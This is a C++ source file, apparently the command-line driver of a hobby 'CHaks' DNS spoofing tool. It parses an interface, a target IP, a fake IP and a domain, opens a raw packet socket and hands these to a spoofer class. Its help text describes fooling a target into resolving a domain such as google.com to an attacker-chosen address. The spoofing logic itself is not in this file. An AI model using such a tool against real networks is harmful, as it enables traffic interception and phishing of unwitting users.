#include "DNSSpoofer.h"

#include <iostream>

#include <net/if.h>
#include <unistd.h>
#include <cstring>

void PrintHelp(char** argv)
{
    std::cout
        << "To use the program, provide the arguments in the following format:\n"
        << argv[0] << " <interface name> <target ip> <fake domain ip> <domain>\n\n"
        << "<interface name>: the interface you wish to use.\n"
        << "<target ip>: ip address of the target you wish to fool\n"
        << "<fake domain ip>: ip that you want the target to think the domain is at\n"
        << "<full domain name>: internet address you wish to spoof\n\n"
        << "Example: " << argv[0] << " eth0 "<< "10.0.2.33 " << "10.0.2.5 " << "https://www.google.com/" << std::endl;
}

// TODO: improve args processing
int ProcessArgs(int argc, char** argv, char* interfaceName, char* targetIP, char* fakeDomainIP, char* domain)
{
    if((argc == 2) && (PacketCraft::CompareStr(argv[1], "?") == TRUE))
    {
        PrintHelp(argv);
        exit(EXIT_SUCCESS);
    }

    if(argc != 5)
        return APPLICATION_ERROR;

    if(PacketCraft::GetStrLen(argv[1]) > IFNAMSIZ)
        return APPLICATION_ERROR;

    PacketCraft::CopyStr(interfaceName, IFNAMSIZ, argv[1]);

    if(PacketCraft::GetStrLen(argv[2]) > INET6_ADDRSTRLEN)
        return APPLICATION_ERROR;
    else
        PacketCraft::CopyStr(targetIP, INET6_ADDRSTRLEN, argv[2]);

    if(PacketCraft::GetStrLen(argv[3]) > INET6_ADDRSTRLEN)
        return APPLICATION_ERROR;
    else
        PacketCraft::CopyStr(fakeDomainIP, INET6_ADDRSTRLEN, argv[3]);


    if(PacketCraft::GetStrLen(argv[4]) > FQDN_MAX_STR_LEN)
        return APPLICATION_ERROR;
    else
        PacketCraft::CopyStr(domain, FQDN_MAX_STR_LEN, argv[4]);

    return NO_ERROR;
}

int main(int argc, char** argv)
{
    char interfaceName[IFNAMSIZ]{};
    char domain[FQDN_MAX_STR_LEN]{};
    char targetIP[INET6_ADDRSTRLEN]{};
    char fakeDomainIP[INET6_ADDRSTRLEN]{};

/*
    const char* domainTest = "www.test.bing.co.uk";
    char buf[FQDN_MAX_STR_LEN]{};
    PacketCraft::DomainToDNSName(domainTest, buf);
    std::cout << domainTest << " converted to " << buf << "\n";
    char buf2[FQDN_MAX_STR_LEN]{};
    PacketCraft::DNSNameToDomain(buf, buf2);
    std::cout << buf << " converted to " << buf2 << "\n";
    return 0;
*/


    if(ProcessArgs(argc, argv, interfaceName, targetIP, fakeDomainIP, domain) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ProcessArgs() error!");
        PrintHelp(argv);
        return APPLICATION_ERROR;
    } 

    int socketFd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(socketFd == -1)
    {
        LOG_ERROR(APPLICATION_ERROR, "socket() error!");
        return APPLICATION_ERROR;
    }

    CHaks::DNSSpoofer dnsSpoofer;
    dnsSpoofer.Spoof(socketFd, interfaceName, targetIP, domain, fakeDomainIP);



    close(socketFd);
    return NO_ERROR;    
}